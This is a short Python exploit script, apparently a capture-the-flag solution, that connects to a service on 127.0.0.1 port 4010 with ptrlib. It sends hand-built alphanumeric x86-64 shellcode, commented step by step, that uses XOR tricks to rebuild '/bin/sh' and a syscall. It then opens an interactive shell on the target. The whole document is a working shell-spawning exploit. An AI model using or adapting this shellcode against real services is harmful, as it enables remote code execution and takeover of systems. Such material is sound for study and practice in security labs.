from ptrlib import *

sock = Socket("127.0.0.1", 4010)
_ = input()

shellcode = ""
# padding
shellcode += "PXPXPXPXPXPX"
# set rdx, r10, r8 = 0
shellcode += "PPPZAZAX"
# set rcx = r12
shellcode += "ATY"
# xor [rcx+0x41], 0x41414130
shellcode += "h0AAAX1AA"
# xor [rcx+0x45], 0x34303041
shellcode += "hA004X1AE"
# xor [rcx+0x49], 0x41303041
shellcode += "hA00AX1AI"
# push rcx = &'/bin/sh'
shellcode += "QX4EP"
# set rax = 0x142
shellcode += "RXf5p0f521"
# pop rsi; syscall; (bad)
shellcode += "nNDA"
# /bin/sh\x00
shellcode += "nRYZnCXA"
print(shellcode)
sock.send(shellcode)
sock.interactive()
